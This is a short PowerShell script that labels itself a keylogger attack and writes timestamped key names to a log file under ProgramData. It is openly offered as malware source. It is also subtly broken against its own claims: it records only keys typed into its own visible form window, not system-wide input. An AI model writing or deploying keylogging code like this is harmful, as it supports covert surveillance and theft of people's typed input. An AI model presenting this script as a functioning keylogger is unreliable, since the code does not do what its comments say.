# Define the log file path for the keylogger
$logFile = "C:\ProgramData\keylogger.log"
$scriptName = "Keylogger.ps1"

# Function to log messages
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}

# Function to capture keystrokes
function Capture-Keystrokes {
    Log-Message "Starting keylogger."
    try {
        # Add a reference to the System.Windows.Forms assembly
        Add-Type -AssemblyName System.Windows.Forms

        $keylogger = New-Object -TypeName System.Windows.Forms.TextBox
        $keylogger.Multiline = $true
        $keylogger.Width = 200
        $keylogger.Height = 200
        $keylogger.Top = 100
        $keylogger.Left = 100
        $keylogger.BackColor = [System.Drawing.Color]::White
        $keylogger.ForeColor = [System.Drawing.Color]::Black
        $keylogger.Font = New-Object System.Drawing.Font("Consolas", 12)
        $keylogger.Add_KeyDown({
            $key = $_.KeyCode
            if ($key -eq [System.Windows.Forms.Keys]::Enter) {
                $loggedKey = "`r`n"
            } else {
                $loggedKey = $key.ToString()
            }
            Log-Message $loggedKey
        })
        $form = New-Object System.Windows.Forms.Form
        $form.Controls.Add($keylogger)
        $form.ShowDialog()
    } catch {
        $errorMessage = "An error occurred while capturing keystrokes: $_"
        Write-Host $errorMessage
        Log-Message $errorMessage "ERROR"
    }
    Log-Message "Keylogger completed."
}

# Log the action
Log-Message "Launching keylogger attack."

# Launch the keylogger attack
Capture-Keystrokes
